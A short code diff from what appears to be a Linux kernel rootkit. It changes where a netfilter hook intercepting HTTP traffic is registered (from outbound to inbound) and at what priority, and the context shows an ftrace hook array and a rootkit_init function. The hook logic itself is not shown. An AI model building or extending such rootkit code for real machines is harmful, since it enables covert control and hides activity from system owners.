@@ -13,9 +13,9 @@ static t_ftrace_hook *f_hook[] = {&(t_ftrace_hook){
 
 static struct nf_hook_ops nfho = {
       .hook        = http_nf_hookfn,
-      .hooknum     = NF_INET_LOCAL_OUT,
+      .hooknum     = NF_INET_LOCAL_IN,
       .pf          = PF_INET,
-      .priority    = NF_IP_PRI_FIRST
+      .priority    = NF_IP_PRI_LAST
 };
 
 static int __init rootkit_init(void) {
